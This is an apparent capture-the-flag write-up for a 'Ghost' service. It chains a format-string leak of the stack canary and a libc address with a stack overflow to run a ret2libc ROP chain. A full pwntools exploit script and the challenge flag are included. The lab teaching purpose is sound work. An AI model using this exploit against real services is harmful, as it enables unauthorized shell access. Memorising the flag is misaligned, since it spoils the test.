<img width="422" height="437" alt="Screenshot 2026-07-12 080907" src="https://github.com/user-attachments/assets/a331ff8e-e79f-4a96-a37b-a98f1808d179" />
<h1>Ghost</h1>

<h2>Steps</h2>

<h3>Step 1 Connect to the Service</h3>

<p>Connect to the remote service using Netcat:</p>

<pre>nc 10.5.14.225 30023</pre>

<p>The service displays:</p>

<pre>=== Operation Cyberheroes :: Ghost ===
Ready. Set. Go.
console&gt;</pre>

<p>The available commands are:</p>

<pre>help
auth</pre>

<p>The <strong>auth</strong> command asks for a launch code. An incorrect code causes the session to terminate.</p>

<h3>Step 2 Identify the Buffer Overflow</h3>

<p>Send increasingly long inputs to the launch-code prompt.</p>

<p>When the input becomes longer than approximately 72 bytes, the service returns:</p>

<pre>*** stack smashing detected ***: terminated</pre>

<p>This confirms that the authentication function contains a stack buffer overflow.</p>

<p>The result also shows that a stack canary is enabled.</p>

<pre>Buffer offset: 72 bytes
Canary size: 8 bytes</pre>

<h3>Step 3 Find the Format String Vulnerability</h3>

<p>At the <strong>console&gt;</strong> prompt, send an unknown command containing format specifiers:</p>

<pre>%p %p %p %p %p %p %p %p</pre>

<p>The service prints stack addresses instead of printing the string normally:</p>

<pre>unknown command: 0x7ffe... (nil) 0x7e49... ...</pre>

<p>This confirms that the command parser contains a format string vulnerability.</p>

<p>The vulnerability can be used to leak stack values before triggering the buffer overflow.</p>

<h3>Step 4 Locate Useful Stack Values</h3>

<p>Use positional format specifiers to inspect multiple stack slots:</p>

<pre>%1$p %2$p %3$p %4$p %5$p ... %55$p</pre>

<p>The important stack positions are:</p>

<table>
<tr>
<th>Format Slot</th>
<th>Leaked Value</th>
</tr>
<tr>
<td>%43$p</td>
<td>Stack canary</td>
</tr>
<tr>
<td>%49$p</td>
<td>Return address inside libc</td>
</tr>
<tr>
<td>%45$p</td>
<td>PIE address</td>
</tr>
<tr>
<td>%51$p</td>
<td>PIE address</td>
</tr>
</table>

<p>The stack canary can be recognised because its final byte is normally <strong>00</strong>.</p>

<h3>Step 5 Leak the Canary and libc Address</h3>

<p>Leak both required values using one command:</p>

<pre>%43$p %49$p</pre>

<p>The first value is the stack canary.</p>

<p>The second value is an address related to:</p>

<pre>__libc_start_main_ret</pre>

<p>The leak and the exploit must be performed on the same connection because every new connection starts a new process with a different stack canary.</p>

<h3>Step 6 Identify the libc Version</h3>

<p>Use the lower 12 bits of the leaked libc address to identify the libc version.</p>

<p>The leak matches Ubuntu glibc 2.35 with the following offsets:</p>

<pre>__libc_start_main_ret = 0x29d90
system                = 0x50d70
/bin/sh               = 0x1d8678
pop rdi; ret           = 0x2a3e5</pre>

<p>Calculate the required runtime addresses:</p>

<pre>libc_base = leaked_libc_address - 0x29d90

system_address = libc_base + 0x50d70
binsh_address  = libc_base + 0x1d8678
pop_rdi        = libc_base + 0x2a3e5</pre>

<h3>Step 7 Build the ret2libc Payload</h3>

<p>After leaking the canary and libc address, send the <strong>auth</strong> command:</p>

<pre>auth</pre>

<p>When the service asks for the launch code, send the overflow payload.</p>

<p>The payload structure is:</p>

<pre>[72 bytes padding]
[8-byte stack canary]
[8-byte fake RBP]
[ret gadget]
[pop rdi; ret gadget]
[address of "/bin/sh"]
[address of system]</pre>

<p>The additional <strong>ret</strong> gadget is used to maintain 16-byte stack alignment before calling <strong>system</strong>.</p>

<h3>Step 8 Exploit on the Same Connection</h3>

<p>The complete attack flow is:</p>

<pre>1. Connect to the service
2. Send %43$p %49$p
3. Parse the stack canary
4. Parse the libc return address
5. Calculate the libc base
6. Calculate system, /bin/sh and gadget addresses
7. Send auth
8. Send the overflow payload
9. Keep the socket open
10. Interact with the spawned shell</pre>

<p>The service may still print:</p>

<pre>access denied.</pre>

<p>This happens because the password check executes before the vulnerable function returns.</p>

<p>After the function returns, execution continues through the ROP chain and launches a shell.</p>

<h3>Step 9 Example Exploit Structure</h3>

<pre>from pwn import *

HOST = "10.5.14.225"
PORT = 30023

OFFSET = 72

LIBC_RET_OFFSET = 0x29d90
SYSTEM_OFFSET = 0x50d70
BINSH_OFFSET = 0x1d8678
POP_RDI_OFFSET = 0x2a3e5

connection = remote(HOST, PORT)

connection.recvuntil(b"console&gt;")
connection.sendline(b"%43$p %49$p")

response = connection.recvuntil(b"console&gt;").decode()

leaks = response.split("unknown command:")[1].split()

canary = int(leaks[0], 16)
libc_leak = int(leaks[1], 16)

libc_base = libc_leak - LIBC_RET_OFFSET

system_address = libc_base + SYSTEM_OFFSET
binsh_address = libc_base + BINSH_OFFSET
pop_rdi = libc_base + POP_RDI_OFFSET

ret_gadget = pop_rdi + 1

connection.sendline(b"auth")
connection.recvuntil(b"launch code&gt;")

payload = b"A" * OFFSET
payload += p64(canary)
payload += p64(0)
payload += p64(ret_gadget)
payload += p64(pop_rdi)
payload += p64(binsh_address)
payload += p64(system_address)

connection.sendline(payload)
connection.interactive()</pre>

<p>The socket must remain open after sending the payload. Closing the input stream may cause the spawned shell to exit immediately.</p>

<h3>Step 10 Retrieve the Flag</h3>

<p>After obtaining the shell, read the flag file:</p>

<pre>cat /chall/flag.txt</pre>

<h2>Final Flag</h2>

<pre>OPUCC{n0_b1n4ry_n0_pr0bl3m_bl4ckb0x_l1bc_f1ng3rpr1nt_r3t2l1bc}</pre>
